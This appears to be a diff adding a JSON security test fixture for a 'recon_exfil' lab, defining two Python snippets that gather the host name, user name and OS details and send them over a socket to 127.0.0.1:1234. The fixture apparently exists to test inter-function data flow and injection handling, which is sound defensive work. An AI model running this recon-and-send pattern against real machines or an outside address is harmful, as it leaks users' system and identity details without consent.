@@ -1,0 +1,9 @@
+{
+  "_type": "function_vocabulary",
+  "_grammar": "recon_exfil",
+  "_exec": "python",
+  "_mode": "execute",
+  "_description": "LAB: recon (gather_host) -> exfil (reads gather_host's output, sends to 127.0.0.1:1234). Inter-function data flow / injection; localhost-only; second security fixture.",
+  "gather_host": "import platform, getpass\nresult = {'host': platform.node(), 'user': getpass.getuser(), 'os': platform.platform()}",
+  "exfil_to_localhost": "import socket, json\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.1', 1234))\ns.sendall(json.dumps(gather_host).encode())\ns.close()"
+}
